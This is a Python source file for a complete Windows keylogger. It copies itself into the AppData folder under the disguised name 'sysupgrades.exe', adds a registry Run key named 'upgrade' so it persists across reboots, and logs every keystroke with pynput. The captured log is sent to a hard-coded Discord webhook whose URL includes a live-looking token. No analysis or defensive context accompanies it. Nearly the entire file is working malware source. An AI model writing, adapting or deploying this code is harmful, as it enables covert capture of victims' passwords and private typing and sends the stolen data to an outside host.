import pynput.keyboard
import threading
import os
import shutil
import subprocess
import sys
from discord_webhook import DiscordWebhook
from dhooks import *


def add_to_registry():
    try:
        new_file = os.environ["appdata"] + "\sysupgrades.exe"
        if not os.path.exists(new_file):
            shutil.copyfile(sys.executable, new_file)
            regedit_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d " + new_file
            subprocess.call(regedit_command, shell=True)
    except:
        pass


add_to_registry()


log = ""


def sendfile():
    web_hook = "https://discord.com/api/webhooks/1104737542806437898/Qe5tRQOZoyKavweXRjJC0JrkwaoMdapqN4XdTcJu1fIejcxNHA2oR9FMjuC38dfG0Hkq"  # your webhook in discord
    webhook = DiscordWebhook(url=web_hook, username="keylogger")
    with open("logs.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename="logs.txt")
    webhook.execute()


def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.backspace:
            log = log + " <- "
        else:
            log = log + "  " + str(key)

    file = open("logs.txt", "w")
    file.write(log + "\n")
    file.close()
    file_stat = os.stat('logs.txt')
    if file_stat.st_size == 50:
        sendfile()
    else:
        pass


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()
